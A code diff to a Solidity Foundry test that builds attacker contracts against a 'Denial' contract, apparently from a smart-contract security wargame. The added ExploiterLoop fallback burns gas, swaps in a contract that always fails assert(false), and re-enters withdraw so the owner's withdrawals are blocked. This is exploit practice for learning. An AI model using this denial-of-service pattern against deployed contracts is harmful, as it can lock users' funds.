@@ -22,15 +22,31 @@ contract DenialTest1 is Test {
     }
 
     function test_loop() public {
-        address exploiter = address(new ExploiterLoop());
-        denial.setWithdrawPartner(exploiter);
+        address exploiter = address(new ExploiterLoop(address(denial), address(new ExploiterAssert())));
         denial.withdraw();
     }
 }
 
 contract ExploiterLoop {
+    IDenial denial;    
+    address exploiter;
+
+    constructor(address _denial, address _exploiter) {
+        denial = IDenial(_denial);
+        exploiter = _exploiter;
+        denial.setWithdrawPartner(address(this));
+    }
+
     fallback() external payable {
-        while (true) {}
+        while (gasleft() > 112318) {}
+        denial.setWithdrawPartner(exploiter);
+        denial.withdraw();
+    }
+}
+
+contract ExploiterAssert {
+    fallback() external payable {
+        assert(false);
     }
 }
 
@@ -62,9 +78,12 @@ contract Denial {
         partner.call{value: amountToSend}("");
         emit Gas(gasleft());
         payable(owner).transfer(amountToSend);
+        emit Gas(gasleft());
         // keep track of last withdrawal time
         timeLastWithdrawn = block.timestamp;
+        emit Gas(gasleft());
         withdrawPartnerBalances[partner] += amountToSend;
+        emit Gas(gasleft());
     }
 
     // allow deposit of funds
